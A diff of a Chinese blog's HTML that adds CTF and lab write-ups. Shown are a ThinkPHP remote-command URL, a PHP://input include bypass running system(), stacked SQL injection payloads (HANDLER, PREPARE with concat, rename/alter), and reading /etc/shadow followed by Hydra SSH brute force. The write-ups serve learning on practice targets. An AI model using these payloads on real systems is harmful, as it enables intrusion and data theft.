@@ -186,8 +186,64 @@
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://111.200.241.243:50986/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</span><br><span class="line">#当前目录</span><br><span class="line">http://111.200.241.243:50986/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20../../</span><br><span class="line">#上级目录，在上级一次发现了一个flag的目录，于是输入</span><br><span class="line">http://111.200.241.243:50986/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20../../../flag</span><br></pre></td></tr></table></figure>
 <p>即可得到</p>
 <p><img src="/images/image-20210128015103215.png" alt="image-20210128015103215"></p>
-<hr>
-<p>未完待续。。。</p>
+<h2 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h2><p>打开场景是一段php代码，如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=str_replace(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>查阅相关资料得知：**<code>php://input</code> 是个可以访问请求的原始数据的只读流，可以读取到来自POST的原始数据。**而<code>strstr()</code>函数可以通过大小写绕过。所以打开burpsuit，由上述php代码可知我们要构造GET参数传递page，所以有：设置请求头<code>GET /?page=PHP://input HTTP/1.1</code>。传递内容：<code>&lt;?php system(&quot;ls&quot;); ?&gt; </code>回传即内容。要注意相关shell操作要用system()函数调用。</p>
+<p><img src="/images/image-20210128222202545.png" alt="image-20210128222202545"></p>
+<p><img src="/images/image-20210128222612588.png" alt="image-20210128222612588"></p>
+<h2 id="suppersqli"><a href="#suppersqli" class="headerlink" title="suppersqli"></a>suppersqli</h2><p>sql注入经典题目了</p>
+<ul>
+<li>直接sqlmap一把梭</li>
+<li>认真分析手注</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> sqlmap python3 sqlmap.py -u &lt;url&gt;/？<span class="built_in">id</span>=<span class="number">1</span> --dbs                             <span class="comment">#查询数据库的库名</span></span><br><span class="line"><span class="number">2</span>、sqlmap python3 sqlmap.py -u &lt;url&gt; -D 数据库名 --tables                      <span class="comment">#查询数据库的表名</span></span><br><span class="line"><span class="number">3</span>、sqlmap python3 sqlmap.py -u &lt;url&gt; -D 数据库名 -T 表名 --column              <span class="comment">#查找字段</span></span><br><span class="line"><span class="number">4</span>、sqlmap python3 sqlmap.py -u &lt;url&gt; -D 数据库名 -T 表名 -C flag --dump        <span class="comment">#可显示flag</span></span><br></pre></td></tr></table></figure>
+<p>但是！sqlmap暴毙了，查询出了数据库但是并没有查出来tables，因为该注入方式在sqlmap里需要跑common-tables.txt表，对方表名不走寻常路QAQ。</p>
+<p>So，转换思路，来考虑手注。首先判断该出存在sql注入点。</p>
+<p>这里参考一篇很棒的博文：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Vinson404/p/7253255.html">我是链接</a></p>
+<blockquote>
+<p>1’不回显而1’#正常显示</p>
+</blockquote>
+<p>这里考虑要先爆出库名，所以得使用语句<code>show databases;</code>无意中尝试发现，当前一句结束后后续语句仍能发挥作用，查询后发现这种注入叫做<strong>堆叠注入</strong>。所以构造<code>/?inject=1&#39;;show databases;</code>可得出数据库名。</p>
+<p>这里有个坑，<strong>字符串做表名时候要加反引号！</strong></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show columns from `1919114514`;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210129011414816.png" alt="image-20210129011414816"></p>
+<p>好了，问题又出现了，因为限制了<code>select</code>等句子，我们无法查看<code>flag</code>列，这里借鉴了大佬们的思路。</p>
+<p><img src="/images/00D989C2.jpg" alt="img"></p>
+<h3 id="方法一：使用handler"><a href="#方法一：使用handler" class="headerlink" title="方法一：使用handler"></a>方法一：使用handler</h3><p>mysql里，使用handler进行查询：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name CLOSE </span><br></pre></td></tr></table></figure>
+<p>因此有：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;handler &#96;1919810931114514&#96; open;handler &#96;1919810931114514&#96; read first;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210129012504472.png" alt="image-20210129012504472"></p>
+<h3 id="方法三：预处理"><a href="#方法三：预处理" class="headerlink" title="方法三：预处理"></a>方法三：预处理</h3><p>首先我们需要知道下列知识：<br> <strong><em>用户变量和set语句：</em></strong></p>
+<p><strong>用户变量</strong>即用户自己定义的变量，我们可以给用户变量分配值，并且可用在任何可以正常使用标量表达式的地方。<br> 引入用户变量之前我们必须使用set语句或select语句来定义它，然后为它赋一个值，否则变量就只有一个空值。<br> 用户变量与连接有关。也就是说，一个客户端定义的变量不能被其它客户端看到或使用。当客户端退出时，该客户端连接的所有变量将自动释放。</p>
+<p>set语句可用于向系统变量或用户变量赋值，针对用户变量的定义如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET @var_name &#x3D; expr [, @var_name &#x3D; expr] ...</span><br></pre></td></tr></table></figure>
+<p>也可使用select语句来定义：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @var_name :&#x3D; expr [, @var_name &#x3D; expr] ...</span><br></pre></td></tr></table></figure>
+<p>用户变量：以”@“开始，形式为”@var_name”,以区分用户变量及列名。它可以是任何随机的，复合的标量表达式，只要其中没有列指定。<br> 一个变量名可以由当前字符集的数字字母字符和“_”、“$”和“.”组成。缺省字符集是ISO-8859-1 Latin1；这可以用mysqld 的–default-character-set 选项更改字符集。<br> 对于SET，可以使用=或:=来赋值，对于SELECT只能使用:=来赋值。<br> 我们可以使用一条简单的select语句查询定义的用户变量的值。</p>
+<p><strong>Prepare语句：</strong></p>
+<p><code>prepare</code>语句利用客户端/服务器二进制协议。 它将包含占位符(<code>?</code>)的查询传递给MySQL服务器，如下例所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT * </span><br><span class="line">FROM products </span><br><span class="line">WHERE productCode &#x3D; ?;</span><br><span class="line">SQL</span><br></pre></td></tr></table></figure>
+<p>当MySQL使用不同的<code>productcode</code>值执行此查询时，不必完全解析查询。 因此，这有助于MySQL更快地执行查询，特别是当MySQL多次执行查询时。 因为<code>prepare</code>语句使用占位符(<code>?</code>)，这有助于避免SQL注入的问题，从而使您的应用程序更安全一些。</p>
+<p>我们来看一下使用MySQL PREPARE语句的例子。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PREPARE stmt1 FROM &#39;SELECT productCode, productName</span><br><span class="line">                    FROM products</span><br><span class="line">                    WHERE productCode &#x3D; ?&#39;;</span><br><span class="line"></span><br><span class="line">SET @pc &#x3D; &#39;S10_1678&#39;;</span><br><span class="line">EXECUTE stmt1 USING @pc;</span><br><span class="line"></span><br><span class="line">DEALLOCATE PREPARE stmt1;</span><br><span class="line">SQL</span><br></pre></td></tr></table></figure>
+<p>首先，使用<code>PREPARE</code>语句准备执行语句。我们使用<code>SELECT</code>语句根据指定的产品代码从<code>products</code>表查询产品数据。然后再使用问号(<code>?</code>)作为产品代码的占位符。</p>
+<p>为了使用MySQL准备语句，您需要使用其他三个MySQL语句如下：</p>
+<ul>
+<li><em>PREPARE</em> - 准备执行的声明。</li>
+<li><em>EXECUTE</em> - 执行由<code>PREPARE</code>语句定义的语句。</li>
+<li><em>DEALLOCATE PREPARE</em> - 发布<code>PREPARE</code>语句。</li>
+</ul>
+<p>接下来，声明了一个产品代码变量<code>@pc</code>，并将其值设置为<code>S10_1678</code>。</p>
+<p>然后，使用<code>EXECUTE</code>语句来执行产品代码变量<code>@pc</code>的准备语句。</p>
+<p>最后，我们使用<code>DEALLOCATE PREPARE</code>来发布<code>PREPARE</code>语句。</p>
+<p>因此这题我们可以这样来进行注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;set @sql&#x3D;concat(&#39;sele&#39;,&#39;ct &#96;flag&#96; from &#96;1919810931114514&#96;&#39;);PREPARE stmt1 from @sql;EXECUTE stmt1;</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39;;sEt @sql&#x3D;concat(&#39;sele&#39;,&#39;ct * from &#96;1919810931114514&#96;;&#39;);prePare stmt from @sql;EXECUTE stmt;</span><br></pre></td></tr></table></figure>
+<p>注意大小写绕过set和prepare</p>
+<h3 id="方法三：使用rename和alter"><a href="#方法三：使用rename和alter" class="headerlink" title="方法三：使用rename和alter"></a>方法三：使用rename和alter</h3><p>我们使用rename和alter这两个命令来更改表名和字段名。因为我们可以访问words里的columns，发现id，也就是说我们输入的1默认是查询words这个表的。因此我们可以把words表改名成words1表，把1919810931114514表改名成words，然后再把1919810931114514里面的flag字段改名成id，然后输入1’ or 1=1#就可以成功得到flag了。<br> 具体构造如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename tables &#96;words&#96; to &#96;words1&#96;;rename tables &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);</span><br></pre></td></tr></table></figure>
 
       
 
@@ -326,8 +382,34 @@
 <p><img src="/images/image-20210127023549393.png" alt="image-20210127023549393"></p>
 <p>于是我们登陆进来了。再其中的content模块中找到了flag3</p>
 <p><img src="/images/image-20210127023904985.png" alt="image-20210127023904985"></p>
+<h2 id="最后一个flag寻找"><a href="#最后一个flag寻找" class="headerlink" title="最后一个flag寻找"></a>最后一个flag寻找</h2><p>在flag3时我们看到了提示<code>/etc/shadow</code>和<code>/etc/passwd</code>这个路径下，我们打开看看</p>
+<p><img src="/images/image-20210129023448269.png" alt="image-20210129023448269"></p>
+<p><strong>QWQ！！！</strong></p>
+<p>一发就中，<code>/home/flag4</code>说明flag4是其一个用户，打开shadow文件康康保存的密码信息</p>
+<p><img src="/images/image-20210129023743781.png" alt="image-20210129023743781"></p>
+<p>$6$说明其采用的是SHA-512加密，好家伙，这基本上夭折了我反解密的路，虽然不抱希望还是试试cmd5</p>
+<p><img src="/images/image-20210129024018065.png" alt="image-20210129024018065"></p>
+<p>果然，那接下来就爆破吧，之前的22端口ssh服务就是个伏笔。<em>(:з」∠)</em></p>
+<p><img src="/images/image-20210129024637140.png" alt="image-20210129024637140"></p>
+<p><strong>HYDRA再立功！</strong></p>
+<p>直接登上去康康</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh flag4@192.168.1.9</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210129024850403.png" alt="image-20210129024850403"></p>
+<p>查了查flag，，，发现flag4我之前就找到了，无root情况下就找到了还能打开，，，那最后一个在哪。。。</p>
+<p>最后康了康<code>/root</code>文件夹，，，发现就在这里。。。</p>
+<p><img src="/images/image-20210129025501413.png" alt="image-20210129025501413"></p>
 <hr>
-<p>还剩下一个flag5我明天再打。。。</p>
+<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>梳理一下整个过程，也觉得很奇怪hhh，为什么在meterpreter时候就可以直接康<code>/home/flag4</code>的内容？最后多跑一步爆破（虽然又爆出来了很开心），同时据说查看<code>thefinalflag.txt</code>也可以直接上传冰蝎的木马，虽然还没有尝试，但值得怀疑（因为/root需要权限，冰蝎马应该无法直接提权）。</p>
+<p>最后，就像flag里说的 <code>well down!!!!</code>。记得看到的一句话说的很对</p>
+<blockquote>
+<p>技术是无罪的，资本胁迫着开源的技术为其攫取利益。</p>
+</blockquote>
+<p>开源的的精神一直传递下来，我能从这个靶机里感受到先达者们设计的用心和对后来者的关心，总之，我玩的很开心。</p>
+<p>引用某个姐姐的一句话QWQ</p>
+<blockquote>
+<p>I hacked for fun, not for 饭</p>
+</blockquote>
+<p>加油！</p>
 
       
 
@@ -1236,11 +1318,11 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+                <a href="javascript:void(0)" class="js-tag color2">Typora</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Typora</a>
+                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
               </li>
              
               <li class="article-tag-list-item">
